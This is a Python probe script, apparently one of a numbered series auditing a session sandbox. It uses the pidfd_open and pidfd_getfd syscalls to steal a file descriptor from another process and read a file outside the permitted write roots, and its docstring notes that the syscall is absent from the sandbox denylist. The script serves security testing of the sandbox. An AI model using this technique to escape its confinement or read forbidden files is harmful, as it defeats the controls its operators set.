#!/usr/bin/env python3
"""P14 cross-process pidfd_getfd: can session A steal a fd from session B?

pidfd_getfd (SYS 438) duplicates a file descriptor out of another
process, requiring only PTRACE_MODE_ATTACH_REALCREDS — same uid is
enough when ptrace_scope permits. It is the modern replacement for the
process_vm_readv / SCM_RIGHTS fd-theft class, and it is NOT in the
envelope denylist. This probe: fork a child holding an open fd to a
file OUTSIDE the write roots, then from the parent (same session) try
to steal it. If it works, the fd is a read of an out-of-root file.
"""
import ctypes, os, sys, time

libc = ctypes.CDLL("libc.so.6", use_errno=True)
def sy(nr, *a):
    ctypes.set_errno(0)
    args=[ctypes.c_long(x) if not isinstance(x,type(None)) else ctypes.c_void_p(None) for x in a]
    r=libc.syscall(ctypes.c_long(nr), *args)
    if r<0: return None, ctypes.get_errno()
    return r, 0
SYS_pidfd_open=434; SYS_pidfd_getfd=438

secret = sys.argv[1]  # a path to read
# child opens the secret OUTSIDE the write roots and holds it
pid = os.fork()
if pid == 0:
    try:
        fd = os.open(secret, os.O_RDONLY)
    except OSError as e:
        print("child_open=ERRNO-%d"%e.errno); os._exit(1)
    os.write(2, b"child holding fd\n")
    time.sleep(30)
    os._exit(0)
time.sleep(0.3)
pfd, err = sy(SYS_pidfd_open, pid, 0)
print("pidfd_open(child)=%s" % ("OK" if pfd is not None else "ERRNO-%d"%err))
if pfd is not None:
    gfd, err = sy(SYS_pidfd_getfd, pfd, 3, 0)  # child's fd 3
    print("pidfd_getfd(child,fd3)=%s" % ("OK fd=%d"%gfd if gfd is not None else "ERRNO-%d"%err))
    if gfd is not None:
        try:
            data = os.read(gfd, 64)
            print("read_stolen_fd=%d bytes: %r" % (len(data), data[:48]))
            print("FD-THEFT-CONFIRMED")
        except OSError as e:
            print("read_stolen_fd=ERRNO-%d"%e.errno)
os.kill(pid, 9); os.waitpid(pid, 0)
